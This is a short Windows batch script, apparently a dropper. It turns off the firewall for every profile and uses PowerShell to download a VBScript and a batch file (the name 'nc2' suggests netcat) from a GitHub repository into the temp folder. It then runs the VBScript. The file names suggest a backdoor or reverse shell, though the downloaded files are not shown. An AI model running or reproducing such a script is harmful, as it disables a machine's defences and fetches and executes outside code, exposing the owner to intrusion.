netsh advfirewall set allprofiles state off
cd %TEMP%
powershell (new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/rfaelfp/c-sharpI/main/back.vbs','back.vbs')
powershell (new-object System.Net.WebClient).DownloadFile('https://github.com/rfaelfp/c-sharpI/blob/main/nc2.bat','nc2.bat')
back.vbs
exit
